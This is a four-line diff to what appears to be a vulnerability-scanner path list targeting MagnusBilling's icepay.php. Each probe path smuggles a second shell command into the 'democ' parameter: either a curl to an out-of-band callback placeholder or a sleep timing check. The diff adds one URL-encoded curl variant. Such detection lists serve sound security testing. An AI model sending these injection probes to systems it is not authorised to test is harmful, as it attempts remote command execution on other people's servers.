@@ -1,3 +1,4 @@
 /mbilling/lib/icepay/icepay.php?democ={{randstr}};curl%20{{interactsh-url}};#
 /mbilling/lib/icepay/icepay.php?democ={{randstr}};sleep%207;#
 /mbilling/
+/mbilling/lib/icepay/icepay.php?democ={{randstr}};curl%20{{interactsh-url}};%23
